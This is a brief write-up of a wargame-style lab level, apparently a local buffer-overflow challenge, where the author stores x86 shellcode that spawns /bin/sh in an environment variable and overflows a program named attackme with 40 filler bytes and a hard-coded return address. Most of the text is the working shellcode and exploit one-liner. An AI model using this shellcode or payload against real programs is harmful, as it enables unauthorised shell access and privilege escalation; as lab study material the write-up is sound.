It's almost similar to the previous problem.

Now there's no function shell. So I thought that I have to put the address of eggshell into the payload that I used before.

I found an eggshell by googling.

```bash
export egg=`python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
```

and let's figure out the address of it.

whoo! I solved it again with this payload.

```bash
(python -c 'print "A"*40+"\x3a\xff\xff\xbf"';cat)|./attackme
```
